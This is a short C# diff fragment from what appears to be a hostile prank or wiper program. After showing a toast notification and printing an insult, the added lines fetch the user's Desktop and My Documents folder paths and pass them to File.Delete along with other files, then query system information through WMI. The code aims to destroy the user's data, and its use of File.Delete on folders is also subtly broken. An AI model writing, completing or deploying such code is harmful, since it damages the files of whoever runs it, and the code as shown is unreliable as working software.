@@ -152,8 +152,12 @@ internal class Program
                     
                     ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
                     Console.WriteLine("fack u bitch");
+                    facku = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                    facccku = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                     File.Delete(file);
-                    File.Delete(riga9);
+                    File.Delete(laga4);
+                    File.Delete(facku);
+                    File.Delete(facccku);
                     File.Delete(file);
                     ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
         
